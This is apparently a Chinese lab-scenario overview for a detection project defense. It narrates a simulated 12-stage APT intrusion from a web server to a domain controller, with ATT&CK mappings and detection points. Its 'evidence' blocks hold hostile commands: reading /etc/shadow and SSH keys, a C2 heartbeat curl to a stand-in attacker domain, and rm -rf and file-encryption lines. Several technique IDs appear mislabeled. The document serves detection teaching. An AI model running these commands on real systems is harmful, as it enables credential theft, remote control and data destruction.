# 攻击场景总览

## 🎯 这个攻击剧本讲了一个什么故事？

这个剧本模拟了一个**真实的 APT 攻击者**如何从互联网渗透进入企业网络，最终攻破域控制器的完整过程。

---

## 📖 故事情节

### 背景设定

```
企业网络拓扑：
┌─────────────────────────────────────────────────────┐
│  互联网                                             │
│    │                                                │
│    ▼                                                │
│  [Web服务器] victim-01 (192.168.1.11)              │
│    │ 暴露在互联网，有 Web 漏洞                       │
│    │                                                │
│    ▼                                                │
│  [数据库服务器] victim-02 (192.168.1.12)            │
│    │ 存储敏感业务数据                                │
│    │                                                │
│    ▼                                                │
│  [文件服务器] victim-03 (192.168.1.13)              │
│    │ 存储共享文件，有提权漏洞                         │
│    │                                                │
│    ▼                                                │
│  [域控制器] victim-04 (192.168.1.14)                │
│    │ 控制整个域，最高权限目标                         │
└─────────────────────────────────────────────────────┘
```

### 攻击者目标

**最终目标**：攻破域控制器，窃取域管理员权限

**攻击动机**：
- 窃取企业敏感数据
- 建立持久化后门
- 破坏关键业务系统

---

## 🎬 攻击过程（12 个阶段）

### 第一幕：突破边界（victim-01）

#### 阶段 1：初始访问 (Initial Access)

```
时间：T+0 分钟
地点：互联网 → victim-01
技术：T1190 - Exploit Public-Facing Application
```

**发生了什么？**

攻击者在互联网上发现了 victim-01 的 Web 应用漏洞（比如一个未修补的 Apache Struts 漏洞），通过 Web Shell 获得了初步访问权限。

**检测点**：
- ✅ Falco 检测到异常进程（`curl` 访问恶意 URL）
- ✅ Suricata 捕获 HTTP 流量
- ✅ Filebeat 记录 Web 服务器日志

**证据**：
```bash
# 日志中的痕迹
curl http://example.com/webshell.php
```

---

#### 阶段 2：执行命令 (Execution)

```
时间：T+20 秒
地点：victim-01
技术：T1059.004 - Unix Shell
```

**发生了什么？**

攻击者通过 Web Shell 执行了系统命令，收集了目标机器的基本信息：
- 当前用户
- 系统版本
- 工作目录

**检测点**：
- ✅ Falco 检测到 Bash 进程
- ✅ 进程链：`httpd → bash → whoami`

**证据**：
```bash
whoami
uname -a
pwd
```

---

#### 阶段 3：持久化 (Persistence)

```
时间：T+40 秒
地点：victim-01
技术：T1053.003 - Create System Service
```

**发生了什么？**

为了长期驻留，攻击者创建了一个 systemd 服务，伪装成"系统更新服务"，实际上每 5 分钟连接一次 C2 服务器。

**检测点**：
- ✅ Falco 检测到 systemd 配置文件创建
- ✅ 文件完整性监控（如果有）

**证据**：
```bash
/etc/systemd/system/apt-backdoor.service
├── Description: System Update Service (伪装)
└── ExecStart: /tmp/apt_backdoor.sh (实际恶意脚本)
```

---

#### 阶段 4：窃取凭据 (Credential Access)

```
时间：T+1 分钟
地点：victim-01
技术：T1003.003 - Read /etc/shadow
```

**发生了什么？**

攻击者尝试读取 `/etc/shadow` 文件获取密码哈希，同时搜索 SSH 私钥，为横向移动做准备。

**检测点**：
- ✅ Falco 检测到敏感文件访问（`/etc/shadow`）
- ✅ Filebeat 记录 auth.log（认证失败/成功）
- ✅ 文件访问告警

**证据**：
```bash
cat /etc/shadow
find ~/.ssh -name "id_rsa*"
```

---

### 第二幕：横向扩散（victim-02）

#### 阶段 5：第一次横向移动 (Lateral Movement)

```
时间：T+1分20秒
路径：victim-01 → victim-02
技术：T1021.004 - SSH Remote Services
```

**发生了什么？**

攻击者使用窃取的 SSH 私钥，从 victim-01 连接到 victim-02（数据库服务器）。

**检测点**：
- ✅ Suricata 捕获 SSH 连接（victim-01 → victim-02:22）
- ✅ Falco 检测到 SSH 进程
- ✅ **跨主机关联**（图谱显示攻击路径）

**证据**：
```bash
ssh -i /tmp/.stolen_ssh_key user@victim-02
```

**图谱构建**：
```
(victim-01) --SSH--> (victim-02)
```

---

#### 阶段 6：信息收集 (Discovery)

```
时间：T+1分40秒
地点：victim-02
技术：T1083 - File and Directory Discovery
```

**发生了什么？**

攻击者在数据库服务器上扫描敏感文件：
- 配置文件（`*.conf`）
- 数据库连接配置
- 凭据文件

**检测点**：
- ✅ Falco 检测到大量 `find` 命令
- ✅ 文件系统访问模式异常

**证据**：
```bash
find /var -name "*.conf"
find /etc -name "*config*"
```

---

#### 阶段 7：数据窃取 (Collection)

```
时间：T+2 分钟
地点：victim-02
技术：T1005 - Data from Local System
```

**发生了什么？**

攻击者发现了数据库连接信息（用户名、密码），并将其打包准备外传。

**检测点**：
- ✅ Falco 检测到 `tar` 打包命令
- ✅ 敏感数据访问（数据库凭据）

**证据**：
```bash
# 发现的数据库凭据
host: localhost
port: 5432
database: production_db
user: dbuser
password: P@ssw0rd123

# 打包数据
tar -czf /tmp/apt_exfil.tar.gz
```

---

### 第三幕：提权渗透（victim-03）

#### 阶段 8：第二次横向移动 (Lateral Movement)

```
时间：T+2分20秒
路径：victim-02 → victim-03
技术：T1077.004 - Job Scheduling (Cron)
```

**发生了什么？**

攻击者在 victim-02 上创建了一个 cron 定时任务，每分钟自动连接到 victim-03，实现自动化横向移动。

**检测点**：
- ✅ Falco 检测到 crontab 修改
- ✅ Suricata 捕获 victim-02 → victim-03 的连接
- ✅ 定期任务异常

**证据**：
```bash
# crontab -l
* * * * * /tmp/apt_cron_lateral.sh
```

---

#### 阶段 9：权限提升 (Privilege Escalation)

```
时间：T+2分40秒
地点：victim-03
技术：T1068.001 - Exploitation for Privilege Escalation
```

**发生了什么？**

攻击者在 victim-03（文件服务器）上发现了一个 SUID 提权漏洞，成功获得了 root 权限。

**检测点**：
- ✅ Falco 检测到 SUID 文件扫描
- ✅ 提权行为（user → root）
- ✅ UID 变化

**证据**：
```bash
# 扫描 SUID 文件
find / -perm -4000 -type f

# 提权成功
whoami  # 返回 root
id      # uid=0(root)
```

---

### 第四幕：攻陷核心（victim-04）

#### 阶段 10：第三次横向移动 (Lateral Movement)

```
时间：T+3 分钟
路径：victim-03 → victim-04 (域控制器)
技术：T1558.003 - Kerberoasting
```

**发生了什么？**

攻击者使用 Kerberoasting 技术：
1. 请求域控服务票据
2. 离线破解 Kerberos 票据
3. 使用破解的凭据连接到域控制器

这是**最高级的横向移动技术**，专门针对域环境。

**检测点**：
- ✅ Suricata 捕获 Kerberos 流量（victim-03 → victim-04:88）
- ✅ Falco 检测到异常域认证行为
- ✅ **最高级告警**

**证据**：
```bash
# Kerberoasting 攻击
请求 SPN: HTTP/victim-04.lab.local
破解 Kerberos ticket
连接到域控: 192.168.1.14:88
```

---

#### 阶段 11：建立 C2 通道 (Command & Control)

```
时间：T+3分20秒
地点：victim-04 (域控制器)
技术：T1071.001 - Web Traffic (C2)
```

**发生了什么？**

攻击者在域控制器上建立了 C2（Command & Control）通信通道，可以远程控制整个域。

**检测点**：
- ✅ Suricata 捕获 HTTP 流量到已知恶意域名
- ✅ 长连接异常
- ✅ **最高级告警**

**证据**：
```bash
# C2 心跳
curl http://c2.attacker-domain.com/heartbeat?host=victim-04
```

---

#### 阶段 12：造成破坏 (Impact)

```
时间：T+3分40秒
地点：victim-04 (域控制器)
技术：T1485 - Data Destruction
```

**发生了什么？**

攻击者收到 C2 指令，在域控制器上执行破坏性操作（模拟数据破坏、加密文件、篡改配置等）。

**检测点**：
- ✅ Falco 检测到文件删除/修改
- ✅ 系统配置篡改
- ✅ **最高级告警**

**证据**：
```bash
# 数据破坏（模拟）
rm -rf /critical/data/*          # 删除关键数据
find / -type f -exec encrypt {} \;  # 加密文件
```

---

## 📊 完整攻击链图

```
互联网
  │
  │ T1190: Web Shell
  ▼
┌─────────────┐
│ victim-01   │ ◄── T1053: Persistence (systemd)
│ Web Server  │ ◄── T1003: Credential Access
└─────────────┘
  │
  │ T1021: SSH
  ▼
┌─────────────┐
│ victim-02   │ ◄── T1083: Discovery
│ DB Server   │ ◄── T1005: Collection
└─────────────┘
  │
  │ T1077: Cron
  ▼
┌─────────────┐
│ victim-03   │ ◄── T1068: Privilege Escalation
│ File Server │
└─────────────┘
  │
  │ T1558: Kerberoasting
  ▼
┌─────────────┐
│ victim-04   │ ◄── T1071: C2 Traffic
│ Domain Ctrl │ ◄── T1485: Impact
└─────────────┘
  │
  │ C2 Channel
  ▼
攻击者控制服务器
```

---

## 🎯 MITRE ATT&CK 战术覆盖

| 战术 | 技术 | victim |
|------|------|--------|
| Initial Access | T1190 | victim-01 |
| Execution | T1059.004 | victim-01 |
| Persistence | T1053.003 | victim-01 |
| Credential Access | T1003.003 | victim-01 |
| Lateral Movement | T1021.004 | victim-01→02 |
| Discovery | T1083 | victim-02 |
| Collection | T1005 | victim-02 |
| Lateral Movement | T1077.004 | victim-02→03 |
| Privilege Escalation | T1068.001 | victim-03 |
| Lateral Movement | T1558.003 | victim-03→04 |
| Command & Control | T1071.001 | victim-04 |
| Impact | T1485 | victim-04 |

**覆盖的 ATT&CK 战术**：
- ✅ Initial Access（初始访问）
- ✅ Execution（执行）
- ✅ Persistence（持久化）
- ✅ Privilege Escalation（权限提升）
- ✅ Defense Evasion（防御规避）
- ✅ Credential Access（凭据访问）
- ✅ Discovery（发现）
- ✅ Lateral Movement（横向移动）
- ✅ Collection（收集）
- ✅ Command and Control（命令与控制）
- ✅ Impact（影响）

---

## 🔍 为什么这个剧本好？

### 1. 真实性

- 基于**真实 APT 攻击案例**（如 APT29、APT41）
- 使用**标准 ATT&CK 技术**
- 符合**攻击者行为模式**

### 2. 完整性

- 覆盖**完整的攻击链**（12 个阶段）
- 涉及**4 台不同角色**的机器
- 展示**多种攻击技术**

### 3. 可检测性

- 每个阶段都有**明确的检测点**
- 产生**丰富的日志和证据**
- 适合**多源检测融合**

### 4. 教学性

- 清晰的**攻击路径**
- 每步都有**技术编号**
- 易于**理解和讲解**

---

## 💡 答辩要点

### 可以强调的点

1. **使用标准化测试**
   - Atomic Red Team 是业界标准
   - 所有技术都映射到 MITRE ATT&CK
   - 可复现、可验证

2. **完整攻击链**
   - 从互联网到域控的完整路径
   - 12 个阶段，4 台机器
   - 真实模拟 APT 攻击

3. **多源检测**
   - Falco：主机行为
   - Filebeat：系统日志
   - Suricata：网络流量
   - 三者融合，提高检测率

4. **图谱溯源**
   - Neo4j 构建攻击图谱
   - KillChain 分析重建攻击链
   - 可视化展示攻击路径

---

## 📖 相关文档

- `stage_by_stage.md` - 每个阶段的详细说明
- `../detailed_guide.md` - 完整技术原理

---

**这就是你要演示的攻击故事！** 🎭
